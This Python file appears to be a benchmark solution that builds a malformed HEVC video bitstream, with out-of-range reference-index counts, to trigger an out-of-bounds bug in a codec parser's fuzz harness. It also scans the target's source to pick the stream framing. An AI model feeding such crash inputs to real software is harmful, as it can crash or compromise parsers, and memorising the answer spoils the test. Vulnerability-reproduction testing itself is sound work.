import os
import io
import tarfile
import tempfile
from typing import Optional, Tuple


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0  # number of bits currently in _cur (0..7), MSB-first write

    def write_bits(self, val: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            bit = (val >> i) & 1
            self._cur = (self._cur << 1) | bit
            self._nbits += 1
            if self._nbits == 8:
                self._buf.append(self._cur & 0xFF)
                self._cur = 0
                self._nbits = 0

    def write_bit(self, bit: int) -> None:
        self.write_bits(1 if bit else 0, 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            v = 0
        code_num = v + 1
        leading_zeros = code_num.bit_length() - 1
        self.write_bits(0, leading_zeros)
        self.write_bit(1)
        if leading_zeros:
            self.write_bits(code_num - (1 << leading_zeros), leading_zeros)

    def write_se(self, v: int) -> None:
        if v == 0:
            code_num = 0
        elif v > 0:
            code_num = 2 * v - 1
        else:
            code_num = -2 * v
        self.write_ue(code_num)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        if self._nbits:
            self.write_bits(0, 8 - self._nbits)

    def get_bytes(self) -> bytes:
        if self._nbits:
            self._cur <<= (8 - self._nbits)
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _emulation_prevention(rbsp: bytes) -> bytes:
    out = bytearray()
    zeros = 0
    for b in rbsp:
        if zeros >= 2 and b <= 3:
            out.append(0x03)
            zeros = 0
        out.append(b)
        if b == 0:
            zeros += 1
        else:
            zeros = 0
    return bytes(out)


def _hevc_nal(nal_unit_type: int, rbsp: bytes, start_code: bool = True) -> bytes:
    # 16-bit header: forbidden_zero_bit(1)=0, nal_unit_type(6), nuh_layer_id(6)=0, nuh_temporal_id_plus1(3)=1
    hdr = ((nal_unit_type & 0x3F) << 9) | 0x0001
    header = bytes([(hdr >> 8) & 0xFF, hdr & 0xFF])
    ebsp = _emulation_prevention(rbsp)
    if start_code:
        return b"\x00\x00\x00\x01" + header + ebsp
    return header + ebsp


def _profile_tier_level_min(bw: _BitWriter) -> None:
    # profile_tier_level(profilePresentFlag=1, max_sub_layers_minus1=0)
    bw.write_bits(0, 2)  # general_profile_space
    bw.write_bit(0)      # general_tier_flag
    bw.write_bits(1, 5)  # general_profile_idc (Main)
    bw.write_bits(0, 32)  # general_profile_compatibility_flags
    bw.write_bits(0, 48)  # general_constraint_indicator_flags
    bw.write_bits(120, 8)  # general_level_idc


def _make_vps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _profile_tier_level_min(bw)
    bw.write_bit(0)  # vps_sub_layer_ordering_info_present_flag
    # i = vps_max_sub_layers_minus1 .. vps_max_sub_layers_minus1 (only i=0)
    bw.write_ue(0)  # vps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)  # vps_max_num_reorder_pics[0]
    bw.write_ue(0)  # vps_max_latency_increase_plus1[0]
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1
    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_sps_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    _profile_tier_level_min(bw)
    bw.write_ue(0)       # sps_seq_parameter_set_id
    bw.write_ue(1)       # chroma_format_idc (4:2:0)
    bw.write_ue(16)      # pic_width_in_luma_samples
    bw.write_ue(16)      # pic_height_in_luma_samples
    bw.write_bit(0)      # conformance_window_flag
    bw.write_ue(0)       # bit_depth_luma_minus8
    bw.write_ue(0)       # bit_depth_chroma_minus8
    bw.write_ue(4)       # log2_max_pic_order_cnt_lsb_minus4 => 8 bits
    bw.write_bit(0)      # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(0)       # sps_max_dec_pic_buffering_minus1[0]
    bw.write_ue(0)       # sps_max_num_reorder_pics[0]
    bw.write_ue(0)       # sps_max_latency_increase_plus1[0]
    bw.write_ue(0)       # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)       # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)       # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)       # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)       # max_transform_hierarchy_depth_inter
    bw.write_ue(0)       # max_transform_hierarchy_depth_intra
    bw.write_bit(0)      # scaling_list_enabled_flag
    bw.write_bit(0)      # amp_enabled_flag
    bw.write_bit(0)      # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)      # pcm_enabled_flag

    bw.write_ue(1)       # num_short_term_ref_pic_sets

    # short_term_ref_pic_set( stRpsIdx=0 )
    bw.write_ue(1)       # num_negative_pics
    bw.write_ue(0)       # num_positive_pics
    bw.write_ue(0)       # delta_poc_s0_minus1[0] => -1
    bw.write_bit(1)      # used_by_curr_pic_s0_flag[0]

    bw.write_bit(0)      # long_term_ref_pics_present_flag
    bw.write_bit(0)      # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)      # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)      # vui_parameters_present_flag
    bw.write_bit(0)      # sps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_pps_rbsp(num_ref_idx_l0_default_active_minus1: int) -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)   # pps_pic_parameter_set_id
    bw.write_ue(0)   # pps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(max(0, num_ref_idx_l0_default_active_minus1))  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)   # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)   # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)   # pps_cb_qp_offset
    bw.write_se(0)   # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    # sps_scaling_list_enabled_flag is 0 => pps_scaling_list_data_present_flag not present
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)   # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_aud_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 3)  # pic_type
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_idr_slice_rbsp() -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_bit(0)  # no_output_of_prior_pics_flag (IRAP)
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(2)   # slice_type (I)
    bw.write_se(0)   # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def _make_trail_p_slice_rbsp(poc_lsb: int, override_flag: int, num_ref_idx_l0_active_minus1: int) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(1)   # slice_type (P)
    bw.write_bits(poc_lsb & 0xFF, 8)  # slice_pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb=8)
    bw.write_bit(1)  # short_term_ref_pic_set_sps_flag
    bw.write_bit(1 if override_flag else 0)  # num_ref_idx_active_override_flag
    if override_flag:
        bw.write_ue(max(0, num_ref_idx_l0_active_minus1))  # num_ref_idx_l0_active_minus1
    bw.write_ue(0)   # five_minus_max_num_merge_cand
    bw.write_se(0)   # slice_qp_delta
    bw.rbsp_trailing_bits()
    # Add some extra bytes resembling slice data to ensure bitreader won't touch OOB in parsers that peek ahead
    base = bw.get_bytes()
    return base + b"\x00" * 32


def _build_hevc_stream(annexb: bool) -> bytes:
    vps = _hevc_nal(32, _make_vps_rbsp(), start_code=annexb)
    sps = _hevc_nal(33, _make_sps_rbsp(), start_code=annexb)
    pps = _hevc_nal(34, _make_pps_rbsp(num_ref_idx_l0_default_active_minus1=32), start_code=annexb)
    aud = _hevc_nal(35, _make_aud_rbsp(), start_code=annexb)
    idr = _hevc_nal(19, _make_idr_slice_rbsp(), start_code=annexb)

    # Two P slices: one relies on PPS default (override_flag=0), another overrides with a bigger value.
    p1 = _hevc_nal(1, _make_trail_p_slice_rbsp(poc_lsb=1, override_flag=0, num_ref_idx_l0_active_minus1=0), start_code=annexb)
    p2 = _hevc_nal(1, _make_trail_p_slice_rbsp(poc_lsb=2, override_flag=1, num_ref_idx_l0_active_minus1=63), start_code=annexb)

    if annexb:
        return vps + sps + pps + aud + idr + p1 + p2

    # Length-prefixed (4-byte big-endian lengths), common in MP4 samples
    units = [vps, sps, pps, aud, idr, p1, p2]
    out = bytearray()
    for u in units:
        out += len(u).to_bytes(4, "big") + u
    return bytes(out)


def _scan_source_for_format_hint(src_path: str) -> str:
    # returns "annexb" or "lengthpref"
    annexb_score = 0
    length_score = 0

    patterns_annexb = (
        "annexb", "annex_b", "start code", "start_code", "next_start_code",
        "find_start_code", "0x000001", "0x00000001"
    )
    patterns_length = (
        "nal_size_length", "nalu_size_length", "lengthSizeMinusOne", "length_size",
        "mp4", "isom", "hvcc", "hvcC", "read_u32", "size-prefixed", "length-prefixed"
    )

    def score_text(txt: str) -> None:
        nonlocal annexb_score, length_score
        lo = txt.lower()
        for p in patterns_annexb:
            if p in lo:
                annexb_score += 1
        for p in patterns_length:
            if p.lower() in lo:
                length_score += 1

    def walk_dir(d: str) -> None:
        nonlocal annexb_score, length_score
        for root, _, files in os.walk(d):
            for fn in files:
                lfn = fn.lower()
                if not (lfn.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".py"))):
                    continue
                path = os.path.join(root, fn)
                try:
                    st = os.stat(path)
                    if st.st_size > 300_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    try:
                        txt = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    if "llvmfuzzertestoneinput" in txt.lower() or "fuzz" in lfn:
                        score_text(txt)
                except Exception:
                    continue

    if os.path.isdir(src_path):
        walk_dir(src_path)
    else:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isreg():
                        continue
                    name = (m.name or "").lower()
                    if not (name.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".py"))):
                        continue
                    if m.size > 300_000:
                        continue
                    if ("fuzz" not in name) and ("llvmfuzzertestoneinput" not in name):
                        # still occasionally the harness isn't named fuzz; but keep it light
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    try:
                        txt = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    score_text(txt)
        except Exception:
            pass

    if length_score > annexb_score:
        return "lengthpref"
    return "annexb"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _scan_source_for_format_hint(src_path or "")
        annexb = (fmt == "annexb")
        return _build_hevc_stream(annexb=annexb)